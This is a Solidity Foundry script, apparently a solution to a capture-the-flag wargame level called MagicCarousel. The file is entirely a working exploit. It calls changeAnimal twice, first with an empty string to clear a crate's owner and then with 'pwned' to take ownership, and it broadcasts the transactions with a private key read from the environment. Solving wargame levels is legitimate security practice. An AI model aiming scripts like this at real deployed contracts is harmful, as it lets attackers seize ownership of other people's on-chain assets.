// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface IMagicCarousel {
    function changeAnimal(string calldata animal, uint256 crateId) external;
}

contract CarouselExploit is Script {

    function run() external {
        address target = 0xYOUR_INSTANCE;

        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        IMagicCarousel carousel = IMagicCarousel(target);

        uint256 crateId = 0; // adjust if needed

        // 1. Clear owner
        carousel.changeAnimal("", crateId);

        // 2. Take ownership
        carousel.changeAnimal("pwned", crateId);

        vm.stopBroadcast();
    }
}